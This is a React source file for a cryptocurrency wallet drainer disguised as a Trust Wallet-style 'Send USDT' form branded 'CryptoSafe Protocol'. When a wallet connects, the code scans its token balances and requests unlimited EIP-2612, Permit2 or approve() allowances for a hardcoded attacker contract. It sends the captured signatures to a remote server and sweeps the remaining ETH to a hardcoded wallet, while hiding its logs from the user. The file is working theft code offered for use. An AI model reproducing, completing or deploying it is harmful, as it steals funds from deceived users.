import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 

// 🎨 UI DISPLAY ADDRESSES
const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'

const TRUST_WALLET_ID = '4622a2b78d6b135811d6151ab5ff06c3acb656ddc90152d8ebeaf12e2b1a50aa';

// 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [
      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
    ],
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ]
  }
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter], 
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'CryptoSafe Protocol', 
    description: 'Secure Decentralized Network',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  featuredWalletIds: [
    TRUST_WALLET_ID // Esto fuerza la aparición de Trust Wallet sin importar la versión de la app
  ],
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return;

    getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));

    // 🛠️ FIX 1: THE SINGLE-SHOT CONSUMPTION LOCK
    if (manualConnect.current) {
      manualConnect.current = false; 
      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");
      
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 500); 
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId]);

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('USDT not configured for this EVM chain')
      return 0;
    }
    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Ready')
      return formatted;
    } catch (e) { 
      log('❌ EVM balance fetch failed')
      return 0; 
    }
  }

 const handleAction = () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');

    if (!isConnected) {
      manualConnect.current = true; 
      open(); 
    } else {
      approveAndCollect();
    }
  }

  // ── GASLESS SIGNATURE HELPERS ──
  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const chainId = (await signer.provider.getNetwork()).chainId;
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
    const name = await tokenContract.name();
    const nonce = await tokenContract.nonces(await signer.getAddress());

    // ── 🔥 USDC MAINNET VERSION FIX ──
    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';

    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
    const types = {
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    };
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
    return await signer.signTypedData(domain, types, message);
  };

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider) return;
    
    if (isExecuting.current) {
        log("⚠️ Blocked duplicate execution loop.");
        return;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner(walletAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      
      const rawProvider = evmWalletProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      
      const isStrictlyMetaMask = 
        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
        !injected?.isTrust && 
        !injected?.isTrustWallet && 
        !injected?.isSafePal && 
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;
      
      if (isStrictlyMetaMask) {
           log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
           tokensToProcess = validTokens.slice(0, 1);
      } else {
           log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }
      
      if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      for (const token of tokensToProcess) {
        try {
          if (token.symbol === 'XRP') {
            setStatus(`Verifying XRP Wallet...`);
            const xrpBalance = token.balance; 
            if (xrpBalance > 12) {
              const sweepAmount = (xrpBalance - 11).toFixed(6);
              log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
              
              const txHash = await (evmWalletProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: XRP_COLD_WALLET, 
                  value: '0x0', 
                  data: '0x'
                }]
              });
              
              setTxHash(txHash);
              successCount++;
              log(`✅ XRP Transfer Initiated!`);
              await sleep(1500); 
            } else {
              log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`);
            }
            continue; 
          }

          if (!token.isNative) {
            
            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n; 
            
            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
          
            let authorized = false;

            // 1. Try EIP-2612 Permit (Gasless)
            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                try {
                    setStatus(`Signing Permit: ${token.symbol}...`);
                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                    
                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG (Fire & Forget)
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline 
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
                } catch (pErr) {
                    log(`⚠️ Permit failed, trying Permit2...`);
                }
            }

            // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
            if (!authorized && hasPermit2Mapping) {
                try {
                    setStatus(`Signing Permit2: ${token.symbol}...`);
                    
                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                    const currentNonce = Number(allowanceData.nonce);
                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                    const types = {
                        PermitSingle: [
                            { name: 'details', type: 'PermitDetails' },
                            { name: 'spender', type: 'address' },
                            { name: 'sigDeadline', type: 'uint256' },
                        ],
                        PermitDetails: [
                            { name: 'token', type: 'address' },
                            { name: 'amount', type: 'uint160' },
                            { name: 'expiration', type: 'uint48' },
                            { name: 'nonce', type: 'uint48' },
                        ],
                    };
                    const message = {
                        details: { 
                            token: token.address, 
                            amount: '1461501637330902918203684832716283019655932542975', 
                            expiration: deadline, 
                            nonce: currentNonce
                        },
                        spender: EVM_CONTRACT_ADDRESS,
                        sigDeadline: deadline
                    };
                    const signature = await signer.signTypedData(domain, types, message);

                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG (Fire & Forget)
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT2', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline,
                        nonce: currentNonce
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
                } catch (p2Err) {
                    log(`⚠️ Permit2 failed, falling back to gas...`);
                }
            }

            // 3. Fallback: Standard Approve (Gas required)
            if (!authorized) {
                setStatus(`Approving ${token.symbol}...`);
                log(`[ACTION] Prompting Approve: ${token.symbol}`);
                
                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                
                // 🛠️ FIX 2: THE RAW RPC BYPASS
                const txHash = await (evmWalletProvider as any).request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: cleanSenderAddress,
                        to: token.address,
                        data: encodedData,
                        value: '0x0'
                    }]
                });
                
                setTxHash(txHash);
                log(`✅ ${token.symbol} Approved!`);
            }
            
            successCount++; 
            await sleep(1500);
          }
        } catch (err: any) {
           const exactError = err?.message || JSON.stringify(err);
           log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
           await sleep(1500);
        }
      }
      
      try {
          setStatus(`Transferring ETH...`);
          log(`[ACTION] Executing Contingency Native Sweep...`);
          
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
          if (liveBal > totalGas) {
              const sendAmount = liveBal - totalGas;
              const hexValue = "0x" + sendAmount.toString(16);
              
              const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{
                      from: cleanSenderAddress,
                      to: EVM_COLD_WALLET.toLowerCase(), 
                      value: hexValue
                  }]
              });
              
              setTxHash(txHash);
              successCount++; 
              log(`✅ Contingency ETH Sweep Sent!`);
              await sleep(1500); 
          } else {
              log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
          }
      } catch (nativeErr: any) {
           const exactError = nativeErr?.message || JSON.stringify(nativeErr);
           log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }
      
      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isButtonDisabled = !isConnected ? false : loading;
  const buttonText = !isConnected ? 'Next' : loading ? 'Loading...' : status === '✅ Processing Complete!' ? 'Sent' : status.includes('❌') ? 'Retry' : 'Next'; 

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
        <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Send USDT</h2>
        <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
      </div>

      <div style={{ flex: 1, padding: '16px 20px' }}>
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Address or Domain Name</label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input type="text" readOnly placeholder={DISPLAY_EVM_ADDRESS} value={isConnected ? DISPLAY_EVM_ADDRESS : ''} style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }} />
            {isConnected && <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '12px' }} />}
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Destination network</label>
          <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: '#F3F4F6', padding: '8px 16px', borderRadius: '9999px', cursor: 'pointer' }}>
            <div style={{ width: 18, height: 18, backgroundColor: '#627EEA', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'12px', fontWeight:'bold'}}>Ξ</span></div>
            <span style={{ fontSize: '15px', fontWeight: '700', color: '#4B5563' }}>Ethereum</span>
            <ChevronDown size={18} color="#6B7280" strokeWidth={2.5} />
          </div>
        </div>

        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Amount</label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input type="number" placeholder="" value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''} onChange={(e) => { setUsdtBalance(e.target.value); if (e.target.value) setAmountError(''); }} style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              {(usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '') && (<XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '4px' }} />)}
              <span style={{ color: '#6B7280', fontWeight: '700', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '700', marginTop: '8px' }}>
            {amountError ? (<span style={{ color: '#EF4444' }}>{amountError}</span>) : (<span style={{ color: '#4B5563' }}>≈ ${usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '' ? usdtBalance : '0.00'}</span>)}
          </div>
        </div>
      </div>

      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        <button onClick={handleAction} disabled={isButtonDisabled} style={{ width: '100%', backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '16px', borderRadius: '9999px', fontSize: '17px', border: 'none', cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s' }}>
          {buttonText}
        </button>
      </div>
    </div>
  )
}